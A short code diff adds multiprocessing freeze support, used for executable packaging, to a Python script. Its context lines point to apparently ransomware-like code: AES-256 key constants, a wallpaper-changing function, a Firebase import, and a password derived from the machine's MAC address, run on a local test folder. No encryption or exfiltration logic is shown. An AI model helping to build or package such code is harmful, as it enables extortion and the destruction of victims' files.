@@ -8,6 +8,7 @@ import hashlib
 import ctypes
 from uuid import getnode as get_mac
 from firebase import firebase
+import multiprocessing
 
 IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
 KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
@@ -55,6 +56,7 @@ def change_bg():
 
 testPath = 'C:/Users/tmdgh/Desktop/test124/'
 
+multiprocessing.freeze_support()
 mac = get_mac()
 password2 = str(mac)
 password = password2.encode()
